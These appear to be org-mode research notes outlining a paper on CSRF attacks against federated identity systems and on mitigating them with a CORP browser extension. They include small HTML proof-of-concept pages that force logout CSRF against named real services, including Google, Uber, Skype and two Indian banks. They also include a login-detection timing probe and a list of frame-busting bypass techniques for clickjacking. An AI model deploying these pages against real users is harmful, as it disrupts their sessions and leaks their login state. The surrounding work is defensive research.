* Paper Outline
** Working Title: Modeling and Mitigation of CSRF Attacks on FIM
- Summary of Abstract
** TODO Abstract
1/2 page
- Summary of Intro
*** Working Abstract:
Our abstract for now(verify) is something like this: we are showing that FIM is
not an all-encompassing security measure. CSRF attacks can still be carried out
on the application as that isnt even part of the model(here demo of regular
csrf attacks on intentionally vulnerable website). In addition FIM is weak to
another csrf attack: logout. Both these problems can be mitigted(hopefully)
using corp
** Introduction
- 2-3 pages
- Summary of paper
- Motivation
- Related Work
- 
** Motivation(Pitch)
- Why is it important
** Related Work
** Method and Technique
- What is FIM
** Modeling
- How we modeled it alloy
** Experimentation
- Implementation of experiments
** Conclusion
** Future Outlook





* Experiment
** Generic
*** Vulnerabilities Check
**** CSRF
**** Click jacking
**** cross site timing attack
- Mitigate atacks using corp extension. 
how: 
- fix one website, then based on e
*** Mitigation tests
- using corp extension

  
* Mitigation
Check with corp extension in chrome

* Robin Linus
- all the websits which use FIM, are vulnerable to click jacking which they are
  on the robin linus site.



* Cross-Site Timing Attack
- Use with Khanacademy: if logged in logo will show up else not;.
#+BEGIN_SRC html :tangle khanacademychecklogin.html
<html>
  <head><title>Khanacademy Check Login Attack</title></head>
  <body>
    <img src="https://www.khanacademy.org/login?continue=%2Ffavicon.ico"/>
  </body>
  
</html>
#+END_SRC
* Attack Khanacademy Logout:
#+BEGIN_SRC html :tangle khanacademylogout.html
<html>
<head><title>Khanacademy Logout Attack</title></head>
<body>
<img src="https://khanacademy.org/logout?contine=/"/>
</body>
</html>
#+END_SRC
* Attack Google Logout
#+BEGIN_SRC html :tangle googlelogout.html
<html>
<head><title>Google Logout Attack</title></head>
<body>
<img src="https://accounts.google.com/Logout"/>
</body>
</html>
#+END_SRC
* Uber logout
#+BEGIN_SRC html :tangle  uberlogout.html
<html>
<head><title>Uber Logout</title></head>
<body>
<img src="https://riders.uber.com/logout"/>
</body>
</html>
#+END_SRC
* Skype logout
#+BEGIN_SRC html :tangle skypelogout.html
<html>
<head><title>Skype Logout</title></head>
<body>
<img src="https://secure.skype.com/portal/logout"/>
</body>
</html>
#+END_SRC
<<<<<<< HEAD
* Super logout
#+BEGIN_EXAMPLE
https://superlogout.com
#+END_EXAMPLE
* SBI logout
#+BEGIN_SRC html :tangle sbilogout.html
<html>
<head><title>SBI Logout</title></head>
<body>
<img src="https://retail.onlinesbi.com/retail/logout.htm"/>
</body>
</html>
#+END_SRC
* IOB logout
#+BEGIN_SRC html :tangle ioblogout.html
<html>
<head><title>IOB Logout</title></head>
<body>
<img src="https://www.iobnet.co.in/ibanking/logout.do">
</body>
</html>
#+END_SRC


* Read on clickjacking
** Busting Frame Busting:a Study of Clickjacking Vulnerabilities on Popular Sites
This paper was published in 2010 . It shows many vulnerability in sites at those times 
and how clickjacking cannot be stopped just by frame busting and new policies must be 
added into our web.

*** Frame bursting example
 i f ( top . location   !=   self.location ){
top .location = self.location ;
}


*** Methods against frame bursting
  1.Use the window.onbeforeunload function to not unload a frame
    1.1 this can be done by asking the user "to not leave page"(alert box) 
    1.2 Flushing the request to unload by stopping the unload request by continuously calling this window.onbeforeunload\
  2.Disable js (both inline and external )
    2.1 inline by by using XSS filters to not allow these scripts
    2.2 External by simplying disable js

  
  3.By passing the Regular expressions in frame busting js 
    By just placing the domian of the victim in the url

  4.Changing the value of location as  it can be redefined

  5.Security="restricted"

** Faults in XFO
   1.Per page specification
   2.One-type domain allowed per page 
   3. *Proxies can remove headers*


** XFO Headers 
   meta tags to make website more secrue by only allowing only some iframes(Cross origin request) 
   using the value specified in the header
*** Value of the header
    1.DENY
    2.SAMEORIGIN
    3.ALLOWED-FROM

 

** X-Content-type
   headers which specify what kind of file is being loaded by a particular request
   eg. text/plain,text/html,images/jpeg

* Websites to check if CORP can protect from csrf
- http://www.itsecgames.com/ (bwapp: buggy web app)
- http://www.dvwa.co.uk/ (dvwa: damn vulnerable web app)
* FIM systems: for each try find an example
https://link.springer.com/content/pdf/10.1007/978-3-642-03829-7.pdf#page=104
** Microsoft's .NET Passport (old)
** UK Athens (old)
** Shibboleth
** CardSpace

